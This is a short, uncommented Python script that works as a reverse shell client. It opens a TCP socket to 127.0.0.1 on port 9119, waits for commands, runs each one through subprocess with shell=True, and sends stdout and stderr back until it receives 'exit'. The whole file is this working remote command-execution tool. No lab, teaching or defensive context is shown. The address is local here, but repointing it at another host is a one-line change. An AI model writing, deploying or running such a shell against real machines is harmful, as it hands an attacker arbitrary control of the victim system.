import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9119))

while True:
    command = s.recv(1024).decode('utf-8') 
    if command.lower() == 'exit': 
        break

    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout + result.stderr

    s.send(output)

s.close()

